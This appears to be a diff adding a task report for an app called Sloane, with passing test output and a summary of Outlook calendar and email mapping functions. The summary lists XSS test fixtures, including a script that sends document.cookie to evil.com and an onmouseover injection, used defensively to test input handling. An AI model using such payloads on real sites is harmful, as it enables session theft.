@@ -1,0 +1,33 @@
+Task P6.2: Pure Mapping Functions with Fixture Unit Tests (including XSS escaping)
+Recorded At: 2026-10-21T20:13:10+05:00
+Test Command: npm test
+Result: 313 passed across 55 suites (0 failing, 0 skipped, duration 14.19s)
+
+Automated Test Suite: server/tests/unit20-outlook-mapping-fixtures.test.js
+Test Output:
+▶ Task P6.2: Outlook Mapping Functions & Fixtures
+  ▶ Calendar & Diary Mapping (mapGraphEventsToDiary)
+    ✔ 1. formatEventTimeRange handles all-day events, normal ranges, and missing values (0.8406ms)
+    ✔ 2. detectEventClashes identifies overlapping non-all-day events and ignores all-day events (0.3047ms)
+    ✔ 3. mapGraphEventsToDiary maps full Graph calendar event fixture into DIARY_ITEMS shape (0.9249ms)
+    ✔ 4. mapGraphEventsToDiary correctly processes XSS payloads in subject and location (0.1747ms)
+    ✔ 5. mapGraphEventsToDiary gracefully handles missing subject and null inputs (0.701ms)
+  ✔ Calendar & Diary Mapping (mapGraphEventsToDiary) (3.8021ms)
+  ▶ Flagged Emails Mapping (mapGraphMessagesToFlagged)
+    ✔ 6. formatMessageSub formats sender name and date accurately (0.4618ms)
+    ✔ 7. mapGraphMessagesToFlagged maps Graph messages to ATTENTION_EMAILS shape with priority rules (0.3413ms)
+    ✔ 8. mapGraphMessagesToFlagged correctly processes XSS payloads in subject and sender (0.1547ms)
+    ✔ 9. mapGraphMessagesToFlagged gracefully handles null and malformed messages (0.1436ms)
+  ✔ Flagged Emails Mapping (mapGraphMessagesToFlagged) (1.3884ms)
+✔ Task P6.2: Outlook Mapping Functions & Fixtures (5.6308ms)
+
+Verification Summary:
+- Implemented pure mapping functions in `server/src/services/outlookDataService.js`:
+  - `mapGraphEventsToDiary`: transforms Graph calendarView items into Sloane's `DIARY_ITEMS` shape (`{ id, title, time, chip, location, isAllDay, isClash, showAs, start, end }`).
+  - `mapGraphMessagesToFlagged`: transforms Graph messages items into Sloane's `ATTENTION_EMAILS` shape (`{ id, title, sub, priority, from, receivedDateTime, webLink }`).
+- Time range formatting handles all-day events ('All day'), localized London time ranges ('HH:MM - HH:MM'), and partial/missing start or end datetimes.
+- Pure clash detection (`detectEventClashes`): identifies overlapping non-all-day events via `(StartA < EndB) && (EndA > StartB)`, correctly marking clashing events with `isClash: true` and `chip: 'URGENT'`.
+- Priority mapping conforms to existing Sloane rules: `importance: 'high'` maps to `'High'` (red pill), while `'normal'` and `'low'` map to `'Normal'` (blue pill).
+- Tested XSS safety with fixtures containing `<script>` tags (`<script>alert('xss-subject')</script>`, `<script>document.location='http://evil.com/?c='+document.cookie</script>`) and attribute injections (`<b onmouseover=alert(1)>Hacked</b>`). Functions preserve exact content safely for downstream HTML escaping.
+- Defensive handling for null, undefined, and malformed inputs with clean fallbacks (`(No subject)`, `Unknown sender`).
+- Mirrored to `Sloane/server/src/services/outlookDataService.js` and `Sloane/server/tests/unit20-outlook-mapping-fixtures.test.js`.
